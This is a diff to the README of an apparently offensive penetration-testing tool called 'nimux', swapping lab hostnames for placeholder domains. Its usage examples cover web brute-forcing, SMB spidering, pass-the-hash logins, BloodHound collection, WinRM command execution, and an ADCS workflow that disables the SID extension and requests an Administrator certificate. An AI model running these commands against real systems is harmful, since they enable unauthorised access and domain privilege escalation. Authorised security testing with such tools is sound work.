@@ -140,19 +140,19 @@ docker run --rm -it --network host ghcr.io/blue0x1/nimux:latest \
 Run lightweight web discovery:
 
 ```bash
-nimux http app.htb --dirs words.txt --workers 100 --status 200,301,302,403 --baseline
-nimux http app.htb --dirs words.txt --auto-calibrate --recursion --depth 2 --extract-links
-nimux http app.htb --files words.txt --extensions php,txt,bak --workers 100 --filter-regex 'Not Found' -fs 325
-nimux http 10.10.10.10 --vhosts vhosts.txt -d app.htb --workers 100 --resume seen.jsonl --json
-nimux dns app.htb --subdomains subdomains.txt --workers 200 --json
+nimux http app.example.local --dirs words.txt --workers 100 --status 200,301,302,403 --baseline
+nimux http app.example.local --dirs words.txt --auto-calibrate --recursion --depth 2 --extract-links
+nimux http app.example.local --files words.txt --extensions php,txt,bak --workers 100 --filter-regex 'Not Found' -fs 325
+nimux http 192.0.2.10 --vhosts vhosts.txt -d app.example.local --workers 100 --resume seen.jsonl --json
+nimux dns app.example.local --subdomains subdomains.txt --workers 200 --json
 ```
 
 Run read-only SMB spidering:
 
 ```bash
-nimux smb files01.corp.local --shares
-nimux smb files01.corp.local --spider --share Public --max-depth 3
-nimux smb files01.corp.local --spider --interesting --size-limit 10485760
+nimux smb files01.example.local --shares
+nimux smb files01.example.local --spider --share Public --max-depth 3
+nimux smb files01.example.local --spider --interesting --size-limit 10485760
 ```
 
 Run the MCP wrapper:
@@ -218,29 +218,29 @@ sudo apt install ../nimux_*.deb
 
 ```bash
 nimux scan 10.10.10.0/24 --port 445,389,5985 --open
-nimux smb dc01.corp.local -u operator -H <nt_hash> -d corp.local --shares --users
-nimux smb files01.corp.local -u operator -p '<password>' -d corp.local --spider --max-depth 3 --interesting
-nimux ldap dc01.corp.local -u operator -p '<password>' -d corp.local --bloodhound --legacy --bloodhound-out bh-legacy.zip
-nimux winrm host.corp.local -u operator -p '<password>' -d corp.local --cmd whoami
-nimux kerberos dc01.corp.local -u operator -p '<password>' -d corp.local --request kinit --out operator.ccache
+nimux smb dc01.example.local -u operator -H <nt_hash> -d example.local --shares --users
+nimux smb files01.example.local -u operator -p '<password>' -d example.local --spider --max-depth 3 --interesting
+nimux ldap dc01.example.local -u operator -p '<password>' -d example.local --bloodhound --legacy --bloodhound-out bh-legacy.zip
+nimux winrm host.example.local -u operator -p '<password>' -d example.local --cmd whoami
+nimux kerberos dc01.example.local -u operator -p '<password>' -d example.local --request kinit --out <ccache>
 nimux scan 10.10.10.0/24 --port 445,389,5985 --proxy socks5://127.0.0.1:1080
 ```
 
 ADCS policy and certificate workflow examples:
 
 ```bash
-nimux ldap dc01.corp.local -u 'gMSA_CA_prod$' -H <nt_hash> -d CORP.LOCAL \
+nimux ldap dc01.example.local -u '<gmsa-account>$' -H <nt_hash> -d EXAMPLE.LOCAL \
   --adcs-policy --ca CORP-CA --adcs-get-disable-extension-list
 
-nimux ldap dc01.corp.local -u 'gMSA_CA_prod$' -H <nt_hash> -d CORP.LOCAL \
+nimux ldap dc01.example.local -u '<gmsa-account>$' -H <nt_hash> -d EXAMPLE.LOCAL \
   --adcs-policy --ca CORP-CA \
   --adcs-set-disable-extension-list 1.3.6.1.4.1.311.25.2
 
-nimux ldap dc01.corp.local -u svc_infra -p '<password>' -d CORP.LOCAL \
+nimux ldap dc01.example.local -u <service-user> -p '<password>' -d EXAMPLE.LOCAL \
   --adcs-request --adcs-rpc --ca CORP-CA --template User \
-  --upn Administrator@corp.local \
+  --upn <admin>@example.local \
   --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
-  --out administrator.pfx
+  --out <admin>.pfx
 ```
 
 LDAP capture listener:
